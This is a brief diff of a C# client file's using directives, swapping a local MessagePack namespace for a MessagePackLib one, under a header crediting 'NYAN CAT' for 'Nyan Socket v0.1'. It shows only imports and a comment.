@@ -1,6 +1,5 @@
 ﻿using Client.Handle_Packet;
 using Client.Helper;
-using Client.MessagePack;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -10,7 +9,7 @@ using System.Net.Security;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Net;
-using Client.Algorithm;
+using MessagePackLib.MessagePack;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Nyan Socket v0.1
